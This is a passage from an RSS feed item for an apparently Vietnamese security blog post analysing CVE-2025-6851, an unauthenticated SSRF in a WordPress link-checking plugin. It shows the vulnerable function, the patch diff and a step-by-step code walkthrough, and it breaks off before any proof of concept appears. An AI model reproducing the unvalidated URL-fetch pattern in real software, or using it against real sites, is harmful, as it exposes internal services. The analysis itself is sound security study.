&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6851 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-28-cve-2025-6851/</link>
      <pubDate>Tue, 28 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-28-cve-2025-6851/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Broken Link Notifier&lt;/strong&gt; cho WordPress bị lỗ hổng &lt;strong&gt;Server‑Side Request Forgery&lt;/strong&gt; trong tất cả các phiên bản đến và bao gồm &lt;strong&gt;1.3.0&lt;/strong&gt; thông qua hàm &lt;code&gt;ajax_blinks()&lt;/code&gt; vốn cuối cùng gọi hàm &lt;code&gt;check_url_status_code()&lt;/code&gt;. Điều này cho phép &lt;strong&gt;attacker chưa xác thực (unauthenticated attackers)&lt;/strong&gt; thực hiện các yêu cầu web tới bất kỳ địa chỉ nào xuất phát từ ứng dụng web và có thể được dùng để truy vấn hoặc sửa đổi thông tin từ các dịch vụ nội bộ.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6851&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6851&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/broken-link-notifier/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Broken Link Notifier Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Broken Link Notifier&lt;/strong&gt;: &lt;strong&gt;1.3.0&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.3.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;    ...&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;} // End check_url_status_code&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;check_url_status_code()&lt;/code&gt; thực hiện việc gọi &lt;code&gt;wp_remote_get()&lt;/code&gt; trực tiếp với URL do người dùng cung cấp mà không hề kiểm tra tính hợp lệ hay mức độ an toàn của URL. Điều này tạo ra lỗ hổng &lt;strong&gt;SSRF (Server-Side Request Forgery)&lt;/strong&gt;. Phiên bản này không kiểm tra scheme của URL, host có hợp lệ hay không, hay IP có thuộc dải private/reserved, nên mọi request đều được thực hiện mà không có hạn chế.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;    // Block SSRF to private/reserved ranges&#xA;    $unsafe = $this-&amp;gt;is_url_unsafe( $link );&#xA;    if ( $unsafe ) {&#xA;        return apply_filters( &amp;#39;blnotifier_status&amp;#39;, $unsafe );&#xA;    }&#xA;    ...&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;} // End check_url_status_code&#xA;&#xA;protected function is_url_unsafe( $url ) {&#xA;    $parts = wp_parse_url( $url );&#xA;&#xA;    if ( ! isset( $parts[ &amp;#39;scheme&amp;#39; ], $parts[ &amp;#39;host&amp;#39; ] ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: invalid or malformed URL&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    $scheme = strtolower( $parts[ &amp;#39;scheme&amp;#39; ] );&#xA;    if ( ! in_array( $scheme, [ &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ], true ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: unsupported URL scheme&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    $host = $parts[ &amp;#39;host&amp;#39; ];&#xA;    $records = @dns_get_record( $host, DNS_A &amp;#43; DNS_AAAA );&#xA;    $ips = [];&#xA;&#xA;    if ( is_array( $records ) &amp;amp;&amp;amp; count( $records ) ) {&#xA;        foreach ( $records as $record ) {&#xA;            if ( isset( $record[ &amp;#39;type&amp;#39; ] ) &amp;amp;&amp;amp; $record[ &amp;#39;type&amp;#39; ] === &amp;#39;A&amp;#39; &amp;amp;&amp;amp; ! empty( $record[ &amp;#39;ip&amp;#39; ] ) ) {&#xA;                $ips[] = $record[ &amp;#39;ip&amp;#39; ];&#xA;            }&#xA;            if ( isset( $record[ &amp;#39;type&amp;#39; ] ) &amp;amp;&amp;amp; $record[ &amp;#39;type&amp;#39; ] === &amp;#39;AAAA&amp;#39; &amp;amp;&amp;amp; ! empty( $record[ &amp;#39;ipv6&amp;#39; ] ) ) {&#xA;                $ips[] = $record[ &amp;#39;ipv6&amp;#39; ];&#xA;            }&#xA;        }&#xA;    } else {&#xA;        $resolved = gethostbyname( $host );&#xA;        if ( $resolved &amp;amp;&amp;amp; $resolved !== $host ) {&#xA;            $ips[] = $resolved;&#xA;        }&#xA;    }&#xA;&#xA;    if ( empty( $ips ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: host could not be resolved&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    foreach ( $ips as $ip ) {&#xA;        if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) {&#xA;            return [&#xA;                &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;                &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;                &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: resolved to internal or reserved IP address&amp;#39;,&#xA;                &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;            ];&#xA;        }&#xA;    }&#xA;&#xA;    return false; // Safe&#xA;} // End is_url_unsafe()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã bổ sung hàm &lt;code&gt;is_url_unsafe()&lt;/code&gt;. Trước khi gọi &lt;code&gt;wp_remote_get()&lt;/code&gt;, URL được kiểm tra chi tiết: chỉ cho phép scheme &lt;code&gt;http&lt;/code&gt; và &lt;code&gt;https&lt;/code&gt;, xác thực host hợp lệ, thực hiện resolve DNS để lấy IP và chặn tất cả các IP nội bộ hoặc thuộc dải reserved. Nếu URL không hợp lệ hoặc không an toàn, hàm sẽ trả về thông tin chi tiết về việc block và &lt;strong&gt;không thực hiện request&lt;/strong&gt;, từ đó &lt;strong&gt;ngăn chặn SSRF hiệu quả&lt;/strong&gt;. Bản vá đảm bảo rằng chỉ các URL an toàn mới được phép gọi, giảm thiểu rủi ro tấn công từ bên ngoài.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Get the &amp;#39;allow_redirects&amp;#39; option and sanitize it&#xA;    $allow_redirects = filter_var( get_option( &amp;#39;blnotifier_allow_redirects&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;&#xA;    // Determine the request method based on allow_redirects option&#xA;    $request_method = $allow_redirects ? &amp;#39;GET&amp;#39; : &amp;#39;HEAD&amp;#39;;&#xA;&#xA;    // Force giving head for images, videos, and audio files&#xA;    if ( $request_method == &amp;#39;GET&amp;#39; ) {&#xA;        $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) );&#xA;        if ( in_array( $file_extension, $this-&amp;gt;get_force_head_file_types() ) ) {&#xA;            $request_method = &amp;#39;HEAD&amp;#39;;&#xA;        }&#xA;    }&#xA;    &#xA;    // User agent&#xA;    $user_agent = $this-&amp;gt;get_user_agent( $url );&#xA;&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;&#xA;    // Check if from youtube&#xA;    if ( $watch_url = $this-&amp;gt;is_youtube_link( $link ) ) {&#xA;        $link = &amp;#39;https://www.youtube.com/oembed?format=json&amp;amp;url=&amp;#39;.$watch_url;&#xA;    }&#xA;&#xA;    // The request args&#xA;    // See https://developer.wordpress.org/reference/classes/WP_Http/request/&#xA;    $http_request_args = apply_filters( &amp;#39;blnotifier_http_request_args&amp;#39;, [&#xA;        &amp;#39;method&amp;#39;      =&amp;gt; $request_method,&#xA;        &amp;#39;timeout&amp;#39;     =&amp;gt; $timeout,&#xA;        &amp;#39;redirection&amp;#39; =&amp;gt; absint( get_option( &amp;#39;blnotifier_max_redirects&amp;#39;, 5 ) ),&#xA;        &amp;#39;httpversion&amp;#39; =&amp;gt; &amp;#39;1.1&amp;#39;,&#xA;        &amp;#39;sslverify&amp;#39;   =&amp;gt; filter_var( get_option( &amp;#39;blnotifier_ssl_verify&amp;#39;, true ), FILTER_VALIDATE_BOOLEAN ),&#xA;        &amp;#39;user-agent&amp;#39;  =&amp;gt; $user_agent&#xA;    ], $url );&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;&#xA;    // Let&amp;#39;s make invalid URL 0 codes broken&#xA;    if ( $code === 0 &amp;amp;&amp;amp; ( $error == &amp;#39;A valid URL was not provided.&amp;#39; || strpos( $error, &amp;#39;cURL error 6: Could not resolve host&amp;#39; ) !== false ) ) {&#xA;        $code = 666;&#xA;    }&#xA;&#xA;    // Possible Codes&#xA;    $codes = $this-&amp;gt;get_status_codes();&#xA;&#xA;    // Files too large&#xA;    if ( $request_method == &amp;#39;GET&amp;#39; ) {&#xA;        $content_length = wp_remote_retrieve_header( $response, &amp;#39;content-length&amp;#39; );&#xA;        if ( $content_length &amp;amp;&amp;amp; $content_length &amp;gt; 10 * 1024 * 1024 ) { // 10 MB&#xA;            $code = 413;&#xA;        }&#xA;    }&#xA;    &#xA;    // Bad links&#xA;    if ( in_array( $code, $this-&amp;gt;get_bad_status_codes() ) ) {&#xA;        $type = &amp;#39;broken&amp;#39;;&#xA;&#xA;    // Warnings&#xA;    } elseif ( in_array( $code, $this-&amp;gt;get_warning_status_codes() ) ) {&#xA;        $type = &amp;#39;warning&amp;#39;;&#xA;&#xA;    // Good links&#xA;    } else {&#xA;        $type = &amp;#39;good&amp;#39;;&#xA;    }&#xA;&#xA;    // Filter status&#xA;    $status = apply_filters( &amp;#39;blnotifier_status&amp;#39;, [&#xA;        &amp;#39;type&amp;#39; =&amp;gt; $type,&#xA;        &amp;#39;code&amp;#39; =&amp;gt; $code,&#xA;        &amp;#39;text&amp;#39; =&amp;gt; ( $code !== 0 &amp;amp;&amp;amp; ( isset( $codes[ $code ] ) &amp;amp;&amp;amp; $codes[ $code ][ &amp;#39;msg&amp;#39; ] != &amp;#39;&amp;#39; ) ) ? $codes[ $code ][ &amp;#39;msg&amp;#39; ] : $error,&#xA;        &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;    ] );&#xA;&#xA;    // Return the array&#xA;    return $status;&#xA;} // End check_url_status_code&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;check_url_status_code()&lt;/code&gt; có nhiệm vụ &lt;strong&gt;kiểm tra trạng thái của một URL&lt;/strong&gt; và phân loại nó là &lt;strong&gt;good (tốt), warning (cảnh báo) hoặc broken (hỏng)&lt;/strong&gt;. Cụ thể, hoạt động của hàm gồm các bước chính:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Lấy tùy chọn cấu hình&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy tùy chọn &lt;code&gt;blnotifier_allow_redirects&lt;/code&gt; từ database và chuyển về boolean → Quyết định xem request sẽ dùng &lt;strong&gt;GET&lt;/strong&gt; hay &lt;strong&gt;HEAD&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Chọn phương thức request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;allow_redirects = true&lt;/code&gt;, mặc định dùng &lt;strong&gt;GET&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu URL là &lt;strong&gt;file media&lt;/strong&gt; (hình ảnh, video, audio), hàm sẽ ép dùng &lt;strong&gt;HEAD&lt;/strong&gt; để tránh tải toàn bộ file lớn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi chú&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Tùy chọn này được thiết lập tại &lt;code&gt;http://localhost/wp-admin/admin.php?page=broken-link-notifier&amp;amp;tab=settings&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/redirect_setting.png&#34; title=&#34;Allow Redirect settings&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/redirect_setting.png&#34; data-sub-html=&#34;&lt;h2&gt;Redirect Setting&lt;/h2&gt;&lt;p&gt;Allow Redirect settings&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/redirect_setting.png&#39; alt=&#34;Redirect Setting&#34; height=&#34;314&#34; width=&#34;1084&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Allow Redirect settings&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Xác định user-agent&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hàm gọi &lt;code&gt;$this-&amp;gt;get_user_agent()&lt;/code&gt; để lấy user-agent phù hợp cho request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Chuẩn hóa URL&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu URL bắt đầu bằng &lt;code&gt;/&lt;/code&gt; → nối với &lt;code&gt;home_url()&lt;/code&gt; để thành URL tuyệt đối.&lt;/li&gt;&#xA;&lt;li&gt;Nếu URL là &lt;strong&gt;link YouTube&lt;/strong&gt;, chuyển sang endpoint &lt;code&gt;oembed&lt;/code&gt; để lấy thông tin an toàn mà không cần truy cập trực tiếp video.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Cấu hình request:&#xA;Xây dựng mảng &lt;code&gt;$http_request_args&lt;/code&gt; chứa các thông số cho request:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;method&lt;/code&gt; (GET/HEAD)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;redirection&lt;/code&gt; (số lần redirect tối đa)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sslverify&lt;/code&gt; (có kiểm tra SSL hay không)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;user-agent&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thực hiện request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;wp_remote_get($link, $http_request_args)&lt;/code&gt; để lấy response.&lt;/li&gt;&#xA;&lt;li&gt;Nếu không lỗi → lấy &lt;strong&gt;status code&lt;/strong&gt; từ server.&lt;/li&gt;&#xA;&lt;li&gt;Nếu lỗi → lấy thông báo lỗi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Xử lý các URL không hợp lệ&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Một số lỗi cơ bản như không cung cấp URL hợp lệ hoặc không resolve được host → gán code đặc biệt &lt;code&gt;666&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Xử lý file quá lớn&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu request GET và &lt;strong&gt;content-length &amp;gt; 10MB&lt;/strong&gt;, gán code &lt;code&gt;413&lt;/code&gt; (Payload Too Large).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Phân loại kết quả dựa trên code HTTP trả về:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;broken&lt;/code&gt; → URL hỏng&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;warning&lt;/code&gt; → URL cảnh báo&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;good&lt;/code&gt; → URL hợp lệ&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;10&#34;&gt;&#xA;&lt;li&gt;Trả về kết quả: Tạo mảng &lt;code&gt;$status&lt;/code&gt; gồm:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;type&lt;/code&gt; → loại URL (&lt;code&gt;good/warning/broken&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;code&lt;/code&gt; → mã HTTP hoặc code đặc biệt&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;text&lt;/code&gt; → thông báo (message hoặc lỗi)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;link&lt;/code&gt; → URL 